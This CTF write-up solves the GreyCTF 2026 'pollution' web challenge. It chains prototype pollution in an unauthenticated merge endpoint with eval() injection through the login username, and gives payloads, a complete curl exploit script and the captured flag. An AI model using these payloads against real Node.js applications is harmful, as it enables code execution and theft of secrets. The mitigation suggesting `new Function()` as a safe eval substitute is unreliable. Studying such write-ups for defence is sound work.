# Pollution — GreyCTF Quals 2026

**Category:** `Web`  
**Challenge Name:** `pollution`  
**Flag:** `grey{Pr07otYp3_p01Lut1oN_i5_b4D_f0R_7He_3NV_38e456b4-a951-4247-96e1-b2171fc1b44f}`

## Overview

The challenge presents a Node.js/Express web application called "LaaS" (Login as a Service) — a minimal user management system with registration, login, profile management, and bulk user import. The flag is stored in `secrets.js` and must be extracted through a combination of prototype pollution and JavaScript injection.

The application has two critical vulnerabilities chained together:

1. A **prototype pollution** vulnerability in a custom `merge()` function
2. An **unsafe `eval()`** in the Passport authentication flow

---

## Source Code Analysis

### The Application

**Key files:**

| File | Purpose |
|------|---------|
| `app.js` | Express setup, routes, view engine |
| `passport.js` | Local authentication with auto-create template |
| `routes/user.js` | User routes including bulk import |
| `routes/auth.js` | Login/register routes |
| `db.js` | JSON file-based database |
| `secrets.js` | Contains the flag and secret keys |
| `util.js` | Password hashing utilities |

**Flag location:** `secrets.js:4`

```javascript
module.exports = {
    session_secret: process.env.SESSION_SECRET || 'pollution-dev-session-secret',
    password_pepper: process.env.PASSWORD_MAC_KEY || 'pollution-dev-mac-key',
    flag: 'grey{placeholder}'
};
```

The placeholder gets replaced by the real flag via `install-flag.sh` at container startup.

### Vulnerability 1: Prototype Pollution in `merge()`

In `routes/user.js:30-43`, there is a recursive `merge()` function:

```javascript
function merge(target, source) {
    Object.keys(source).forEach((key) => {
        if (isObject(source[key])) {
            if (!target[key]) {
                target[key] = {};
            }
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    });
    return target;
}
```

This is called in the `/upload/users` bulk import endpoint at line 252:

```javascript
const merged = merge(Object.assign({}, user), item);
```

The endpoint accepts a JSON array of user objects and merges them with existing users. Critically, this endpoint requires **no authentication** (line 218):

```javascript
.post('/upload/users', handleImportUpload, async (req, res) => {
```

The merge function does not guard against `__proto__` or `constructor.prototype` traversal, allowing an attacker to pollute `Object.prototype`.

#### The Pollution Path

By sending a JSON object with a `constructor` key containing a nested `prototype`, the merge recursively walks up to `Object.prototype` and sets arbitrary properties on it:

1. `merge({}, item)` → `target` is a plain `{}`, `source` is the imported item
2. Key `"constructor"` → `target.constructor` is the `Object` constructor function
3. `merge(Object, { prototype: { userAutoCreateTemplate: "..." } })`
4. Key `"prototype"` → `Object.prototype` is the target
5. `merge(Object.prototype, { userAutoCreateTemplate: "..." })`
6. Key `"userAutoCreateTemplate"` → sets `Object.prototype.userAutoCreateTemplate = "..."`

After this, EVERY object in the process inherits `userAutoCreateTemplate`.

### Vulnerability 2: Unsafe `eval()` in Passport Authentication

In `passport.js:18-58`, the `authenticate` function has a code path for auto-creating users on first login:

```javascript
function authenticate(req, username, password, done) {
    store.db.collection('users')
        .findOne({ lcUsername: username.toLowerCase() }, ... , async (err, user) => {
            if (err || !user) {
                if (options.userAutoCreateTemplate) {
                    try {
                        const wrapperFunction = `(function() {
                            const username = '${username}';
                            const passport = '${password}';
                            return \`${options.userAutoCreateTemplate}\`;
                        })()`;
                        const newUser = JSON.parse(eval(wrapperFunction));
                        // ... insert new user and log them in
                        return done(null, created);
                    } catch (error) {
                        console.log(error);
                    }
                }
                return done(null, false, { message: 'Invalid username or password.' });
            }
```

Key observations:

1. **Trigger condition:** `options.userAutoCreateTemplate` must be truthy. Since `options` doesn't define this property, it inherits from `Object.prototype` after prototype pollution.

2. **Template literal injection in username:** The `username` and `password` are directly interpolated into a JavaScript string that gets `eval()`'d. A single quote (`'`) in the username can break out of the string literal and inject arbitrary JavaScript.

3. **Scope access:** The `eval` runs in `passport.js`'s module scope, giving access to `require`, `process`, and all imported modules.

4. **JSON.parse constraint:** The result of the `eval` must be valid JSON because it's passed to `JSON.parse()` to create the user object.

---

## Exploitation

### Step 1: Prototype Pollution via User Import

Send a POST request to `/upload/users` with a multipart form containing a crafted JSON file:

```json
[{
    "lcUsername": "alice",
    "constructor": {
        "prototype": {
            "userAutoCreateTemplate": "{}"
        }
    }
}]
```

- `lcUsername: "alice"` matches an existing user, so the merge path is taken
- The `constructor.prototype` nesting pollutes `Object.prototype.userAutoCreateTemplate`
- The value `"{}"` is a valid JSON object string that will be used later

**Why `"{}"`?** The `userAutoCreateTemplate` value gets interpolated into the inner template literal: `` return \`${...}\` ``. Using `"{}"` ensures the template produces valid JSON (`"{}"`) which parses without error if our injected code returns early.

### Step 2: Eval Injection via Login Username

Send a POST request to `/login` with a crafted username that breaks out of the string and injects arbitrary code:

**Username payload:**
```
';require('fs').writeFileSync('public/images/profileImages/flag.txt',require('./secrets').flag);return '{}';const dummy='
```

This produces the following wrapper function when eval'd:

```javascript
(function() {
    const username = '';
    require('fs').writeFileSync('public/images/profileImages/flag.txt', require('./secrets').flag);
    return '{}';
    const dummy = '';
    const passport = 'PASSWORD';
    return `{}`;
})()
```

The execution flow:

1. `const username = ''` — sets the username to empty string
2. `require('fs').writeFileSync(...)` — uses Node.js's file system module to write the flag to a publicly accessible path
3. `return '{}'` — returns a valid JSON string before reaching the template literal
4. `JSON.parse('{}')` — creates an empty object as the new user
5. User is inserted into the database and automatically logged in via `done(null, created)`

**Why `public/images/profileImages/`?** The Dockerfile sets this directory's permissions to `775` (writable by `appuser`), while the parent `public/` directory is read-only (`755`, owned by `root`).

### Step 3: Exfiltrating the Flag

The Express static middleware serves files from `/app/public`:

```javascript
app.use(express.static(__dirname + '/public'))
```

So fetching `/images/profileImages/flag.txt` returns the flag file that was written in Step 2.

---

## Full Exploit Script

```bash
#!/bin/bash
BASE="http://54471052-6b44-41b8-a82a-a9ee50aaae44.challs.nusgreyhats.org"

# Step 1: Prototype Pollution
curl -s -X POST "$BASE/upload/users" \
  -F 'upload-users=@-;type=application/json' << 'EOF'
[{
  "lcUsername": "alice",
  "constructor": {
    "prototype": {
      "userAutoCreateTemplate": "{}"
    }
  }
}]
EOF

# Step 2: Eval injection — write flag to public file
USERNAME="';require('fs').writeFileSync('public/images/profileImages/flag.txt',require('./secrets').flag);return '{}';const dummy='"
PASSWORD="whatever"

curl -s -X POST "$BASE/login" \
  --data-urlencode "username=${USERNAME}" \
  --data-urlencode "password=${PASSWORD}"

# Step 3: Retrieve flag
curl -s "$BASE/images/profileImages/flag.txt"
```

**Output:**
```
grey{Pr07otYp3_p01Lut1oN_i5_b4D_f0R_7He_3NV_38e456b4-a951-4247-96e1-b2171fc1b44f}
```

---

## Mitigations

To prevent these vulnerabilities in a real application:

1. **Avoid recursive merge with user input** — Use libraries like `lodash.merge` with prototype pollution guards, or use `Object.create(null)` for merge targets
2. **Never `eval()` user-controlled input** — Use safe alternatives like `new Function()` with restricted scope, or better yet, avoid dynamic code execution entirely
3. **Proper input validation** — Check that usernames don't contain characters like `'`, `` ` ``, or `${`
4. **Principle of least privilege** — The `userAutoCreateTemplate` feature should require explicit opt-in and validation, not be triggerable by prototype pollution
5. **Use `Object.create(null)`** for objects like `options` so they don't inherit from `Object.prototype`
6. **Restrict file writes** — The upload directory permissions should not allow arbitrary file writes via code injection
